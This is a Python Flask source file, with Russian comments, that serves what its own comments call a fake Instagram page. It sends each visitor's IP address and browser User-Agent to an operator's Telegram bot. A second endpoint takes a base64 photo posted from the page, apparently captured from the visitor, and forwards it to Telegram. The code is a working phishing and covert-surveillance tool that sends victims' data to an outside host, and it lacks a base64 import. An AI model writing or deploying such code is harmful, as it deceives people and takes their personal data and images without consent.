from flask import Flask, render_template, request
import requests
import os
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

@app.route('/')
def fake_instagram():
    # Получаем данные о посетителе
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    # Отправляем уведомление в Telegram
    message = f"🕵️ Кто-то зашел на фейковый Instagram!\nIP: {user_ip}\nUser-Agent: {user_agent}"
    requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
        json={"chat_id": CHAT_ID, "text": message}
    )

    # Рендерим фейковую страницу Instagram
    return render_template("instagram.html")
@app.route('/send-photo', methods=['POST'])
def send_photo():
    photo_data = request.json.get('photo')
    requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
        data={"chat_id": CHAT_ID},
        files={"photo": ("photo.jpg", base64.b64decode(photo_data.split(',')[1]))}
    )
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)